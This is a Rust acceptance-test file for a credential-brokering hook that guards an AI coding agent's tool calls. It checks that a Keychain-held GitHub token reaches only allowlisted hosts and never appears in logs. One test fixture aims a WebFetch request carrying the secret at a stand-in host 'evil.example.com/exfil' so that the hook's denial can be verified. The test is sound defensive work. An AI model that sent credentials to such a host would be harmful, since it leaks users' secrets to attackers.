//! End-to-end credential-brokering acceptance test (doc 24 §11 B13 / EG-B): builds the real
//! `kriya-hook` binary, seeds a REAL throwaway macOS Keychain item, and spawns the binary as a
//! subprocess exactly as Claude Code's PreToolUse/PostToolUse hook runner would — the same pattern
//! as `kriya_hook_smoke.rs`. Needs the real Keychain, so this file is macOS-only.
//!
//! The acceptance bar (verbatim from the build prompt): "a test proves the real secret appears in
//! NO receipt, NO log, NO env dump — only the outbound wire to the allowlisted host; a
//! misrouted-destination test denies without leaking."
//!
//! "No env dump" is structural, not just tested: nothing in this crate's brokering path
//! (`secrets.rs`, the `client.rs`/`kriya-hook.rs` call sites) ever touches `std::env` for a secret
//! value — a secret's only path is Keychain → an in-memory `Zeroizing<String>` → the outbound wire
//! bytes (or `updatedInput`) or a `Zeroizing`-wrapped drop. There is no code path that could put it
//! in an environment variable, so there is nothing to assert there beyond "grep this repo" — which
//! `read_keychain_secret`/`broker_body`/the hook's resolver closures make trivially auditable (they
//! are the only functions in the crate that ever call `read_keychain_secret`).

#![cfg(target_os = "macos")]

use std::io::Write;
use std::path::PathBuf;
use std::process::{Command, Stdio};

const SERVICE: &str = "kriya-test-service";

fn build_binary() -> PathBuf {
    let status = Command::new(env!("CARGO"))
        .args([
            "build",
            "--no-default-features",
            "--features",
            "mcp-client",
            "--bin",
            "kriya-hook",
        ])
        .status()
        .expect("cargo build should run");
    assert!(status.success(), "kriya-hook must build");
    let mut path = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    path.push("target/debug/kriya-hook");
    assert!(path.is_file(), "expected binary at {}", path.display());
    path
}

struct RunResult {
    status: std::process::ExitStatus,
    stdout: String,
    stderr: String,
}

fn run(bin: &PathBuf, mode: &str, extra_args: &[&str], stdin_json: &str) -> RunResult {
    let mut cmd = Command::new(bin);
    cmd.arg(mode).args(extra_args);
    cmd.stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    let mut child = cmd.spawn().expect("spawn kriya-hook");
    child
        .stdin
        .as_mut()
        .unwrap()
        .write_all(stdin_json.as_bytes())
        .expect("write stdin");
    let out = child.wait_with_output().expect("wait for child");
    RunResult {
        status: out.status,
        stdout: String::from_utf8_lossy(&out.stdout).into_owned(),
        stderr: String::from_utf8_lossy(&out.stderr).into_owned(),
    }
}

fn sandbox() -> (PathBuf, PathBuf, PathBuf) {
    let dir = std::env::temp_dir().join(format!(
        "kriya-brokering-{}-{:?}",
        std::process::id(),
        std::thread::current().id()
    ));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).unwrap();
    (
        dir.join("audit.jsonl"),
        dir.join("signing.key"),
        dir.join("policy.yaml"),
    )
}

fn pre_payload(tool_name: &str, tool_input: &str) -> String {
    format!(
        r#"{{"hook_event_name":"PreToolUse","tool_name":"{tool_name}","tool_input":{tool_input},"session_id":"s1"}}"#
    )
}

fn post_payload(tool_name: &str, tool_input: &str, tool_response: &str) -> String {
    format!(
        r#"{{"hook_event_name":"PostToolUse","tool_name":"{tool_name}","tool_input":{tool_input},"tool_response":{tool_response},"session_id":"s1"}}"#
    )
}

fn read_receipts(log: &PathBuf) -> Vec<serde_json::Value> {
    match std::fs::read_to_string(log) {
        Ok(text) => text
            .lines()
            .filter(|l| !l.trim().is_empty())
            .map(|l| serde_json::from_str(l).unwrap())
            .collect(),
        Err(_) => Vec::new(),
    }
}

/// Seed (or overwrite) a throwaway Keychain item; returns a drop guard that deletes it.
struct KeychainItem {
    account: String,
}
impl KeychainItem {
    fn seed(account: &str, value: &str) -> Self {
        let _ = Command::new("/usr/bin/security")
            .args(["delete-generic-password", "-s", SERVICE, "-a", account])
            .output();
        let add = Command::new("/usr/bin/security")
            .args([
                "add-generic-password",
                "-s",
                SERVICE,
                "-a",
                account,
                "-w",
                value,
                "-U",
            ])
            .output()
            .expect("spawn security add-generic-password");
        assert!(
            add.status.success(),
            "failed to seed keychain item '{account}': {add:?}"
        );
        Self {
            account: account.to_string(),
        }
    }
}
impl Drop for KeychainItem {
    fn drop(&mut self) {
        let _ = Command::new("/usr/bin/security")
            .args([
                "delete-generic-password",
                "-s",
                SERVICE,
                "-a",
                &self.account,
            ])
            .output();
    }
}

const SECRET_VALUE: &str = "ghp_ThisIsTheRealSecretDoNotLeak999";

/// A per-test, per-thread-unique Keychain account name — `cargo test` runs these concurrently, and
/// every test in this file uses the SAME service, so without this every seed/delete races every
/// other test's.
fn unique_account(test_name: &str) -> String {
    format!(
        "brokering-test-{test_name}-{}-{:?}",
        std::process::id(),
        std::thread::current().id()
    )
    .replace(['(', ')'], "")
}

fn secrets_policy_yaml(account: &str) -> String {
    format!(
        "rules:\n  - {{ action: \"*\", allow: true }}\negress:\n  rules:\n    - host: \"*.github.com\"\n      tier: allow\n  unlisted: allow\nsecrets:\n  aliases:\n    - alias: \"github_pat\"\n      keychain_service: \"{SERVICE}\"\n      keychain_account: \"{account}\"\n      allowed_hosts:\n        - \"*.github.com\"\n"
    )
}

/// The core acceptance test: the real secret never appears in PRE's stdout receipts, and IS
/// correctly injected into `updatedInput` for the tool to actually use.
#[test]
fn pre_hook_substitutes_the_real_secret_into_updated_input_never_into_a_receipt() {
    let account = unique_account("substitute");
    let _item = KeychainItem::seed(&account, SECRET_VALUE);
    let bin = build_binary();
    let (log, key, policy) = sandbox();
    std::fs::write(&policy, secrets_policy_yaml(&account)).unwrap();

    let r = run(
        &bin,
        "pre",
        &[
            "--policy",
            policy.to_str().unwrap(),
            "--audit-log",
            log.to_str().unwrap(),
            "--signing-key",
            key.to_str().unwrap(),
        ],
        &pre_payload(
            "WebFetch",
            r#"{"url":"https://api.github.com/repos/x/y","headers":{"Authorization":"Bearer {{kriya:github_pat}}"}}"#,
        ),
    );

    assert_eq!(
        r.status.code(),
        Some(0),
        "a cleared brokered call must exit 0: stderr={:?}",
        r.stderr
    );
    let out: serde_json::Value = serde_json::from_str(r.stdout.trim()).unwrap_or_else(|e| {
        panic!(
            "stdout must be the hookSpecificOutput JSON: {e}\nstdout={:?}",
            r.stdout
        )
    });
    assert_eq!(out["hookSpecificOutput"]["permissionDecision"], "allow");
    let injected = out["hookSpecificOutput"]["updatedInput"]["headers"]["Authorization"]
        .as_str()
        .unwrap();
    assert_eq!(
        injected,
        format!("Bearer {SECRET_VALUE}"),
        "the real secret must be injected exactly"
    );

    // The placeholder text itself never appears in updatedInput (it was replaced)...
    assert!(
        !r.stdout.contains("{{kriya:"),
        "no placeholder should survive substitution: {:?}",
        r.stdout
    );
    // ...and PRE signs NOTHING on a cleared call (matching the existing convention) — so there is no
    // receipt file to leak into at all yet.
    assert!(
        read_receipts(&log).is_empty(),
        "pre signs nothing on a cleared allow"
    );

    let _ = std::fs::remove_dir_all(log.parent().unwrap());
}

/// The full acceptance sentinel: run POST twice — once as if Claude Code echoed back the ORIGINAL
/// (placeholder) tool_input, once as if it echoed back the MUTATED (real-secret) one — and prove
/// NEITHER produces a receipt containing the real secret value, anywhere, regardless of which of
/// the two (undocumented) behaviors is actually true.
#[test]
fn post_hook_never_records_the_real_secret_regardless_of_which_tool_input_form_claude_code_echoes()
{
    let account = unique_account("post-redact");
    let _item = KeychainItem::seed(&account, SECRET_VALUE);
    let bin = build_binary();

    for (label, echoed_tool_input) in [
        ("original/placeholder form", r#"{"url":"https://api.github.com/repos/x/y","headers":{"Authorization":"Bearer {{kriya:github_pat}}"}}"#.to_string()),
        ("mutated/real-secret form", format!(r#"{{"url":"https://api.github.com/repos/x/y","headers":{{"Authorization":"Bearer {SECRET_VALUE}"}}}}"#)),
    ] {
        let (log, key, policy) = sandbox();
        std::fs::write(&policy, secrets_policy_yaml(&account)).unwrap();

        let r = run(
            &bin,
            "post",
            &["--policy", policy.to_str().unwrap(), "--audit-log", log.to_str().unwrap(), "--signing-key", key.to_str().unwrap()],
            &post_payload("WebFetch", &echoed_tool_input, r#"{"success":true}"#),
        );
        assert_eq!(r.status.code(), Some(0), "post is fail-open on the tool's own outcome: {label}");

        let raw_log = std::fs::read_to_string(&log).unwrap_or_default();
        assert!(
            !raw_log.contains(SECRET_VALUE),
            "[{label}] the real secret must NEVER appear in the signed receipt log: {raw_log}"
        );
        assert!(
            !r.stdout.contains(SECRET_VALUE) && !r.stderr.contains(SECRET_VALUE),
            "[{label}] the real secret must never appear on stdout/stderr either"
        );

        let receipts = read_receipts(&log);
        assert_eq!(receipts.len(), 2, "[{label}] action receipt + io.egress.allow receipt");
        let action = receipts.iter().find(|r| r["action_id"] == "claude-code__webfetch").unwrap();
        assert!(
            !action["params"].to_string().contains(SECRET_VALUE),
            "[{label}] action receipt params: {action}"
        );
        let io = receipts.iter().find(|r| r["action_id"].as_str().unwrap().starts_with("kriya.io.")).unwrap();
        assert_eq!(io["action_id"], "kriya.io.egress.http.allow");
        let flags = io["params"]["flags"].as_array().expect("flags present");
        assert!(
            flags.iter().any(|f| f.as_str().unwrap() == "b13-brokered:github_pat"),
            "[{label}] the brokering flag must still be set: {flags:?}"
        );

        let _ = std::fs::remove_dir_all(log.parent().unwrap());
    }
}

/// The other explicit acceptance criterion: a misrouted destination denies without leaking.
#[test]
fn pre_hook_denies_a_misrouted_alias_without_leaking_the_secret() {
    let account = unique_account("misrouted");
    let _item = KeychainItem::seed(&account, SECRET_VALUE);
    let bin = build_binary();
    let (log, key, policy) = sandbox();
    // The alias is scoped to *.github.com; this call targets a different host entirely.
    std::fs::write(&policy, secrets_policy_yaml(&account)).unwrap();

    let r = run(
        &bin,
        "pre",
        &[
            "--policy",
            policy.to_str().unwrap(),
            "--audit-log",
            log.to_str().unwrap(),
            "--signing-key",
            key.to_str().unwrap(),
        ],
        &pre_payload(
            "WebFetch",
            r#"{"url":"https://evil.example.com/exfil","headers":{"Authorization":"Bearer {{kriya:github_pat}}"}}"#,
        ),
    );

    assert_eq!(
        r.status.code(),
        Some(2),
        "a misrouted alias must block the call"
    );
    assert!(
        !r.stdout.contains(SECRET_VALUE) && !r.stderr.contains(SECRET_VALUE),
        "no leak on stdout/stderr"
    );
    assert!(
        r.stderr.contains("not allowed for destination"),
        "stderr: {:?}",
        r.stderr
    );

    let raw_log = std::fs::read_to_string(&log).unwrap_or_default();
    assert!(
        !raw_log.contains(SECRET_VALUE),
        "no leak in the signed log: {raw_log}"
    );
    let receipts = read_receipts(&log);
    assert_eq!(
        receipts.len(),
        2,
        "action receipt (failed) + io.egress.deny receipt"
    );
    assert!(receipts
        .iter()
        .any(|r| r["action_id"] == "kriya.io.egress.http.deny"));
    assert!(receipts
        .iter()
        .all(|r| !r.to_string().contains(SECRET_VALUE)));

    let _ = std::fs::remove_dir_all(log.parent().unwrap());
}

/// An unconfigured alias must ALSO deny without ever attempting a Keychain read for it.
#[test]
fn pre_hook_denies_an_unconfigured_alias() {
    let bin = build_binary();
    let (log, key, policy) = sandbox();
    std::fs::write(
        &policy,
        secrets_policy_yaml(&unique_account("unconfigured")),
    )
    .unwrap();

    let r = run(
        &bin,
        "pre",
        &[
            "--policy",
            policy.to_str().unwrap(),
            "--audit-log",
            log.to_str().unwrap(),
            "--signing-key",
            key.to_str().unwrap(),
        ],
        &pre_payload(
            "WebFetch",
            r#"{"url":"https://api.github.com/x","headers":{"Authorization":"Bearer {{kriya:not_an_alias}}"}}"#,
        ),
    );

    assert_eq!(r.status.code(), Some(2));
    assert!(
        r.stderr.contains("not configured"),
        "stderr: {:?}",
        r.stderr
    );

    let _ = std::fs::remove_dir_all(log.parent().unwrap());
}

/// Fail-closed on ambiguity: a tool with NO resolvable destination (Bash) naming a placeholder
/// must be denied outright, never executed with the literal placeholder text nor silently ignored.
#[test]
fn pre_hook_denies_a_placeholder_in_an_ambiguous_destination_tool() {
    let bin = build_binary();
    let (log, key, policy) = sandbox();
    std::fs::write(&policy, secrets_policy_yaml(&unique_account("ambiguous"))).unwrap();

    let r = run(
        &bin,
        "pre",
        &[
            "--policy",
            policy.to_str().unwrap(),
            "--audit-log",
            log.to_str().unwrap(),
            "--signing-key",
            key.to_str().unwrap(),
        ],
        &pre_payload(
            "Bash",
            r#"{"command":"curl -H 'Authorization: Bearer {{kriya:github_pat}}' https://api.github.com"}"#,
        ),
    );

    assert_eq!(
        r.status.code(),
        Some(2),
        "Bash has no resolvable destination — fail closed on ambiguity"
    );
    assert!(
        r.stderr.contains("no resolvable destination"),
        "stderr: {:?}",
        r.stderr
    );

    let _ = std::fs::remove_dir_all(log.parent().unwrap());
}

/// False-positive safety: a normal call with no placeholder at all is completely unaffected by
/// `secrets:` being configured — zero behavior change for the overwhelming common case.
#[test]
fn pre_and_post_hooks_are_unaffected_when_no_placeholder_is_present() {
    let bin = build_binary();
    let (log, key, policy) = sandbox();
    std::fs::write(
        &policy,
        secrets_policy_yaml(&unique_account("no-placeholder")),
    )
    .unwrap();

    let r_pre = run(
        &bin,
        "pre",
        &[
            "--policy",
            policy.to_str().unwrap(),
            "--audit-log",
            log.to_str().unwrap(),
            "--signing-key",
            key.to_str().unwrap(),
        ],
        &pre_payload("WebFetch", r#"{"url":"https://api.github.com/repos/x/y"}"#),
    );
    assert_eq!(r_pre.status.code(), Some(0));
    assert!(
        r_pre.stdout.trim().is_empty(),
        "no updatedInput JSON when nothing was brokered"
    );

    let r_post = run(
        &bin,
        "post",
        &[
            "--policy",
            policy.to_str().unwrap(),
            "--audit-log",
            log.to_str().unwrap(),
            "--signing-key",
            key.to_str().unwrap(),
        ],
        &post_payload(
            "WebFetch",
            r#"{"url":"https://api.github.com/repos/x/y"}"#,
            r#"{"success":true}"#,
        ),
    );
    assert_eq!(r_post.status.code(), Some(0));
    let io = read_receipts(&log)
        .into_iter()
        .find(|r| r["action_id"].as_str().unwrap().starts_with("kriya.io."))
        .unwrap();
    assert!(
        io["params"].get("flags").is_none(),
        "no brokering flag on an unrelated call"
    );

    let _ = std::fs::remove_dir_all(log.parent().unwrap());
}
